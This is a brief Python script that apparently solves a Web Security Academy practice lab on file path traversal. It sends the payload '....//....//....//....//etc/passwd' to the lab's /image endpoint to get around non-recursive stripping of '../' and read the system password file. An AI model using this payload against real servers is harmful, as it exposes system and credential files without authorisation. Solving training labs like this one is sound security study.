# Lab: File path traversal, traversal sequences stripped non-recursively
# difficulty: practitioner

import requests

sub = '0a9b00bd04c60c8b8182c646001d0062'
url = f'https://{sub}.web-security-academy.net'

def main():
    params = {'filename': '....//....//....//....//etc/passwd'}
    
    endpoint = '/image'
    r = requests.get(url + endpoint, params=params)
    print(r.text)

if __name__ == '__main__':
    main()